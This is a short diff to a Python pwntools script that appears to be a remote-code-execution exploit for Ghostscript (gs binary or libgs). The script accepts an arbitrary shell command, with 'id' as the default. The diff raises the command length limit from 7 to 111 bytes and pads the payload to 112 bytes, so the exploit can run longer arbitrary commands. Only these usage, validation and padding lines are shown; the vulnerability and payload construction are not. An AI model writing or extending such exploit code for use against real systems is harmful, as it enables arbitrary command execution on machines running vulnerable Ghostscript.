@@ -9,7 +9,7 @@ from pwn import *
 from sys import argv
 
 if len(argv) < 2:
-    print("Usage: python {argv[0]} </path/to/gs_bin or libgs> [rce command(<=7Byte) default:id]")
+    print("Usage: python {argv[0]} </path/to/gs_bin or libgs> [rce command(<=111Byte) default:id]")
     exit(1)
 
 
@@ -18,12 +18,12 @@ elf_path = argv[1]
 if len(argv) > 2:
     rce_cmd = argv[2]
     rce = rce_cmd.encode()
-    if len(rce) > 7 or len(rce) == 0:
-        print("Invalid rce command: improper length; 0 < len(rce.encode()) < 8")
+    if len(rce) > 111 or len(rce) == 0:
+        print("Invalid rce command: improper length; 0 < len(rce.encode()) < 112")
         exit(2)
 else:
     rce_cmd = 'id'
-rce = rce_cmd.encode().ljust(8, b'\0').hex()
+rce = rce_cmd.encode().ljust(112, b'\0').hex()
 
 # Load the ELF file
 elf = ELF(elf_path)
